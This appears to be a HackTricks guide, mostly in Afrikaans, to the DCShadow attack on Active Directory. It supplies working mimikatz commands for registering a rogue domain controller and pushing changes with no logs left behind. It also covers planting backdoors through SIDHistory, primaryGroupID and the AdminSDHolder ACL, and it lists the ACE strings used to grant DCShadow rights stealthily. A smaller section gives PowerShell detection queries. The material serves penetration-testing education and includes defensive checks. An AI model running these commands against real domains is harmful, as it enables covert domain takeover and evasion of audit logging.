# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Dit registreer 'n **new Domain Controller** in die AD en gebruik dit om **attributes te push** (SIDHistory, SPNs...) op gespesifiseerde objekte **sonder om enige logs** oor die **modifications** agter te laat. Jy **het DA**-privileges nodig en moet binne die **root domain** wees.\
Let daarop dat indien jy verkeerde data gebruik, taamlik lelike logs sal verskyn.<sup>[[2]](#references)</sup>

Om die aanval uit te voer, het jy 2 mimikatz-instances nodig. Een daarvan sal die RPC-servers met SYSTEM-privileges begin (jy moet hier die changes aandui wat jy wil uitvoer), en die ander instance sal gebruik word om die waardes te push:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Let daarop dat **`elevate::token`** nie in die `mimikatz1`-sessie sal werk nie, aangesien dit die voorregte van die thread verhoog het, maar ons moet die **voorreg van die process** verhoog.\
Jy kan ook ’n "LDAP"-object kies: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Jy kan die veranderinge vanaf ’n DA of vanaf ’n gebruiker met hierdie minimale permissions uitvoer:

- In die **domain object**:
- _DS-Install-Replica_ (Add/Remove Replica in Domain)
- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- Die **Sites object** (en sy children) in die **Configuration container**:
- _CreateChild and DeleteChild_
- Die object van die **computer wat as ’n DC geregistreer is**:
- _WriteProperty_ (Not Write)
- Die **target object**:
- _WriteProperty_ (Not Write)

Jy kan [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) gebruik om hierdie voorregte aan ’n unprivileged user toe te ken (let daarop dat dit sommige logs sal laat). Dit is baie meer beperkend as om DA-voorregte te hê.\
Byvoorbeeld: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Dit beteken dat die username _**student1**_ wanneer dit op die machine _**mcorp-student1**_ aangemeld is, DCShadow-permissions oor die object _**root1user**_ het.

## DCShadow gebruik om backdoors te skep
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Misbruik van primêre groepe, enumerasiegapings en opsporing

- `primaryGroupID` is ’n afsonderlike attribute van die groep se `member`-lys. DCShadow/DSInternals kan dit direk skryf (byvoorbeeld `primaryGroupID=512` stel vir **Domain Admins**) sonder on-box LSASS-afdwinging, maar AD **skuif** steeds die gebruiker: die verandering van PGID verwyder altyd lidmaatskap van die vorige primêre groep (dieselfde gedrag vir enige teikengroep), dus kan jy nie die ou primêre-groep-lidmaatskap behou nie.<sup>[[1]](#references)</sup>
- Default tools voorkom dat ’n gebruiker uit hul huidige primêre groep verwyder word (`ADUC`, `Remove-ADGroupMember`), dus vereis die verandering van PGID gewoonlik direkte directory writes (DCShadow/`Set-ADDBPrimaryGroup`).
- Membership reporting is inkonsekwent:
- **Sluit** lede in wat deur primêre groepe afgelei word: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Laat** lede weg wat deur primêre groepe afgelei word: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit wat `member` inspekteer, `Get-ADUser <user> -Properties memberOf`.
- Rekursiewe kontroles kan lede van primêre groepe mis indien die **primêre groep self genestel** is (byvoorbeeld die gebruiker se PGID wys na ’n genestelde groep binne Domain Admins); `Get-ADGroupMember -Recursive` of LDAP recursive filters sal daardie gebruiker nie terugstuur nie, tensy recursion primêre groepe eksplisiet resolve.
- DACL-truuks: aanvallers kan **ReadProperty deny** op `primaryGroupID` by die gebruiker (of op die groep se `member`-attribute vir nie-AdminSDHolder-groepe) instel, wat effektiewe lidmaatskap vir die meeste PowerShell-navrae verberg; `net group` sal steeds die lidmaatskap resolve. AdminSDHolder-beskermde groepe sal sulke denies reset.

Opsporing-/moniteringsvoorbeelde:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Kontroleer bevoorregte groepe deur die `Get-ADGroupMember`-uitset met `Get-ADGroup -Properties member` of ADSI Edit te vergelyk om teenstrydighede op te spoor wat deur `primaryGroupID` of versteekte attribute veroorsaak word.<sup>[[1]](#references)</sup>

## Shadowception - Gee DCShadow permissions met DCShadow (geen gewysigde permissions-logboeke nie)

Ons moet die volgende ACEs met ons gebruiker se SID aan die einde byvoeg:<sup>[[2]](#references)</sup>

- Op die domeinobjek:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Op die aanvaller se rekenaarobjek: `(A;;WP;;;UserSID)`
- Op die teikengebruiker-objek: `(A;;WP;;;UserSID)`
- Op die Sites-objek in die Configuration-container: `(A;CI;CCDC;;;UserSID)`

Om die huidige ACE van ’n objek te kry: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

In hierdie geval moet jy **verskeie veranderinge** maak, nie net een nie. Gebruik in die **mimikatz1-sessie** (RPC-server) die **`/stack`-parameter met elke verandering**. Jy moet dan slegs een keer **`/push`** gebruik om al die gestapelde veranderinge vanaf die rogue server toe te pas.

[**Meer inligting oor DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
